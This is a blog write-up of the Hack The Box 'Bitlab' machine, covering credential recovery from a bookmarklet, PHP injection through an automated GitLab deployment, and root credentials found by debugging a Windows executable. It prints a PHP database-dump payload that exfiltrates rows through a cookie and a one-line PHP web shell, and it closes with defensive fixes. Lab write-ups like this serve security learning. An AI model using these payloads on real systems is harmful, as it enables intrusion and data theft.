---
layout: post
title:  "HTB: Bitlab Walkthrough"
categories: writeups HTB
permalink: /:categories/:title
---


![Bitlab Logo](../../assets/img/writeups/htb/bitlab/box_header_pic.png)

Date: 1/11/2020   
Author: n0tAc0p  

Table of Contents
1. TOC 
{:toc} 

### TL;DR

`Credentials stored in js bookmarklet --> php injection via automated deployments on GitLab --> credentials stored in Windows binary`

### Recon and Enumeration

As always, we started with a `masscan`. It only came back with ports 22, and 80. Digging in with `nmap` we find more details.

![NMAP Scan](../../assets/img/writeups/htb/bitlab/detailed_port_scan.png)

So we have:

- 22 (SSH)
- 80 (HTTP with Nginx)

#### GitLab

Bringing up port 80 in a browser, we are greeted with a login page to GitLab, a private git repository server instance. As with similar offerings, such as GOGs, these instances allow developers to host code on something that is not GitHub, all the while enjoying the magic of git. For more information, see GitLab's [homepage](https://about.GitLab.com/){:target="_blank"} ([1]).

If we check out the robots.txt file for the page, it has over 50 entries! Turns out, GitLab keeps an updated robots.txt file that ships with each version of GitLab. I compared the robots.txt of this instance to that in the current codebase for GitLab, but found no differences. As well, it seemed no matter what URL I appended to 10.10.10.114, the page redirected me to the login page. Which was very interesting at the time.

![GitLab homepage](../../assets/img/writeups/htb/bitlab/gitlab_homepage_1.png)

Trying default credentials, as well as some simple combinations, did not bring up anything useful. There were 3 tabs that we could navigate too, without logging in.
- Explore
- Help
- About GitLab

The explore tab showed public repositories, public snippets (pieces of code that aim to be re-used) and public groups. To my sad suprise, there was absoutely no public information available on the site. The "About GitLab" tab brought us to the help page on GitLab's website, so not very helpful either. 

#### Bad Bookmarklet

Heading over to Help brought us to a very interesting `Bookmarks` page.

![Bookmarks](../../assets/img/writeups/htb/bitlab/bookmarks.png)

With the source not far behind:

![Bookmarks Source](../../assets/img/writeups/htb/bitlab/bookmarks_source.png)

You will notice the file is a NetScape bookmark file. This does not mean much by itself, except that it is a tool for creating "pretty" bookmark pages. See [the npm documentation](https://www.npmjs.com/package/netscape-bookmarks){:target="_blank"} for more details ([2]). The most important thing to note here is that the final bookmark, labeled "GitLab Login" seemed to be linked to a javascript function. I have never seen this before (I am quite new). Turns out, its a "bookmarklet" which allows us to execute javascript code when we click on it (seems like a greeaaat idea). More information about bookmarklets can be found here on [caiorss's github page](http://caiorss.github.io/bookmarklets.html){:target="_blank"} ([3]).

Given the bookmarklet was called "login" and it was partially hex encoded, I had a feeling it was an auto-login script, which means it would have some credentials in it. Throwing the entire thing into the python IDLE, it automatically parsed some of the hex characters to ascii (how nice of it).

![Bookmarklet Credentials](../../assets/img/writeups/htb/bitlab/clave_creds.png)

And there we have our creds for a user named `clave`

#### Directories

`gobuster` did not return anything of note, but `nikto` (another web scanning tool) did find a few files that we could access without having to authenticate. One of those files was /profile, which will be important later on.

Nikto Scan
![Nikto Scan](../../assets/img/writeups/htb/bitlab/nikto.png)


### Aditional Authenticated Recon

Now that we could login to GitLab, we took a look around at all the code available to us.

We found 2 repositories owned by user clave:

1. Deployer
2. Profile

![Clave Repositories](../../assets/img/writeups/htb/bitlab/clave_homepage.png)

#### Repository: Deployer

Below is the main file in this repository

![deployer Index.html](../../assets/img/writeups/htb/bitlab/updated_index.png)

A tad confusing at first, but essentially it says: "Whenever there is a merge into the master branch of the Profile repository, pull the latest changes to the local server (which hosts it)". Which I assumed also means the local machine updates the server with the merged code. Seems like a decent way to inject code, if we could find a public facing page in the Profile repository.

#### Repository: Profile

To the rescue comes the Profile respository. I checked every commit of each branch, and did not find anything special. But I realized the index.html page in this repository was the same file you get if you navigate to the /profile directory (10.10.10.114/profile). Now all we had to do was find a payload to inject into the page! We did not have to look far.

index.html of the profile page

![Profile Index Page](../../assets/img/writeups/htb/bitlab/profile_index.png)

Here is the profile page in action (10.10.10.114/profile):

![Profile Page](../../assets/img/writeups/htb/bitlab/profile.png)

#### Snippets

Now that we are authenticated, we can see the following code in the snippets section:

![PHP Snippet](../../assets/img/writeups/htb/bitlab/snippet.png)

We also note that the Profile Repository has a ToDo in the README that says to add postgresql support. Ironic.

### Getting User 

I found 2 different ways to get user access to the box. One required an "initial foothold," while the other did not.

1.) Direct to user via PHP DB Dump  
2.) Reverse shell (www-data) -> clave

*In Both Cases, we modified the version of index.html inside the `test deploy` branch, since master was protected from direct writes*

#### Option 1: PHP DB Dump

Utilizing the php code snippet we found, we added the following code to the top of the index.html file. The goal of the code was to extract the data via a cookie.

~~~php
<?php
$db_connection = pg_connect("host=localhost dbname=profiles user=profiles password=profiles");
$result = pg_query($db_connection, "SELECT * FROM profiles");
$cookie_name =  'yummyCookie';
$output =  pg_fetch_all($result);
// Neccessary to convert data rows to a readable string
$serial = serialize($output);
setcookie($cookie_name, $serial, time() + (86400 * 1), '/'); // 86400 = 1 day (in seconds)
?>
~~~

I am sure there were other ways to exfiltrate data, but I thought doing it through a cookie would be fun. Once the index.html page was updated, I created a merge request with master. I assigned the merge request to me (so that I could approve it instantly) and then merged with master.  

We waited a minute or two, then triggered our payload by using Burp Suite Repeater to send a GET request to the /profile page. The response is below:

![Burp Payload Trigger](../../assets/img/writeups/htb/bitlab/cookie_payload.png)

The cookie is URL encoded, but can be decoded easily with Burp's built in decoder to get:

`a:1:{i:0;a:3:{s:2:"id";s:1:"1";s:8:"username";s:5:"clave";s:8:"password";s:22:"c3NoLXN0cjBuZy1wQHNz==";}}`

I am positive there is another way besides using **serial()** to turn data into strings in php. Yet, I am mostly unfamiliar with php, and this got the job done. Using this password allows us to SSH into Clave, and get the user hash.

{:refdef: style="text-align: center;"}
![Clave Shell](../../assets/img/writeups/htb/bitlab/clave_user.png)
{: refdef}


#### Option 2: PHP Reverse shell

Instead of adding the DB dump payload to the index.html page, we write a simple payload to allow us to get a reverse shell. Then we run our script locally on that box. We merge into master the same as we did above.

Reverse Shell Payload
~~~php
<?php shell_exec($_GET['cmd']) ?>
~~~

I used Burp Repeater to send payloads as with Option 1. I used [Pentest Monkey's](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet){:target="_blank"} python reverse shell payload to get a reverse shell back to my machine. [(4)]

{:refdef: style="text-align: center;"}
![Burp Reverse Shell Payload](../../assets/img/writeups/htb/bitlab/alternative_burp.png)
{: refdef}

This gives us a shell with user `www-data`. From there, I created /tmp/exploit.php which contained a slightly modified version of the original payload (uses echo instead of cookie exfiltration)

~~~php
<?php
$db_connection = pg_connect("host=localhost dbname=profiles user=profiles password=profiles");
$result = pg_query($db_connection, "SELECT * FROM profiles");
$output =  pg_fetch_all($result);
// Neccessary to convert data rows to a readable string
$serial = serialize($output);
echo $serial;
?>
~~~

Running the scripts gives us the same results as in Option 1.

![www-data shell](../../assets/img/writeups/htb/bitlab/alternative_execution.png)

So in either option, we gain access to a user shell. Not sure which method I like better, but in the end they both work fine.

### Privilege Escalation

After some digging we found out why /profile and /help could be accessed without authentication. Those pages were being hosted on an Apache Server, while the instance of GitLab was being hosted via Nginx running inside of a docker container!! Pretty cool stuff. Not sure if this is industry standard or not, but it answers some questions I had earlier on.

I used the Python 2 SimpleHTTPServer to transfer linEnum.sh and linPEAS.sh to the box. Neither found anything out of the ordinary on the box. The only thing that stuck out was a Windows 32bit PE Executable in clave's home directory. 

{:refdef: style="text-align: center;"}
![RemoteConnection.exe](../../assets/img/writeups/htb/bitlab/weird_file.png)
{: refdef}

Reversing this seemed like the best next option, so I transferred it to my windows machine for testing. I used IDA Free and OllyDbg for this portion.

#### Reverse Engineering RemoteConnection.exe

**Disclaimer: I am quite inexperienced with Reverse Engineering. So any assumptions or guesses I make about this piece of software may be incorrect**

Running this exe inside of windows we get a simple "Access Denied" message.

{:refdef: style="text-align: center;"}
![Running RemoteConnection.exe](../../assets/img/writeups/htb/bitlab/access_denied.png)
{: refdef}

Using IDA got me nowhere, so I headed to OllyDbg for some dynamic analysis. Note that some people said they used Immunity Debugger. The process I describe below should work for any capable debugger. My main goal was to search for the logic that prints out "Access Denied" and hopefully find a credential check we can abuse to gain access, get a password, etc.

My Plan:

1. Find the function call which prints out "Access Denied"
2. Look at the logic above the call and search for clues for any checks that take place

Turns out, very little reversing was needed. I found the function call I was looking for at `0x005E1668`. I then restarted the program and stepped over and through some of the commands before the call. Suprisingly enough, there was an SSH command string that contained root's password on the stack. Sweeeeeet.

![Reverse Engineering](../../assets/img/writeups/htb/bitlab/debugging_1.png)

With the root password in tow, we can login via SSH as root and get the root hash.

{:refdef: style="text-align: center;"}
![Root User](../../assets/img/writeups/htb/bitlab/root_user.png)
{: refdef}

#### Other Methods

Other users on the forums made mention to possible privlege escalation using git pull or the like. In my limited time looking for this vulnerability, I could not find it. I am looking forward to reading other writeups to better understand this and other alternative escalation paths.

### Conclusion

#### Fixes

Why were we able to root this box?
1. Clave stored their plaintext login information in a javascript bookmarklet (which they disclosed publically by overwriting the default help page in GitLab), which gave us access to GitLab  
**Fix: Do not use an auto-login script that is publically available** 
2. Clave left a snippet of PHP code which contained DB credentials, which allowed us to get their SSH password  
**Fix: Do not publically post anything with credentials in it**
3. We were able to inject PHP code into a publically available page using the repositories at hand  
**Fix: Ensure at least 2 developers look at each merge request before approving it (not always possible)**
4. The RemoteConnection.exe contained plaintext root credentials  
**Fix: Unsure at this point since I do not fully understand the purpose of the application. My suggestion is for root to own the application, and clave not have access to it**
5. We were able to login as root over SSH  
**Fix: Do not allow root login over SSH**

#### Final Notes

Although getting credentials for clave took ages becasue of the number of resets on the box, it was mostly realistic, and confirmed my weaknesses in Reverse Engineering. Shoutout to `Frey & thek` for making this possible. Onto the next one...

As always, I appreciate feedback and questions if you have them. Feel free to reply to the thread you found the link to this page on, or DM me on the forums.

### References

1. GitLab Homepage: https://about.GitLab.com/
2. NPM NetScape Bookmark Documentation: https://www.npmjs.com/package/netscape-bookmarks
3. Caiorr's github website: http://caiorss.github.io/bookmarklets.html
4. Pentest Monkey Reverse Shell Cheatsheet: http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet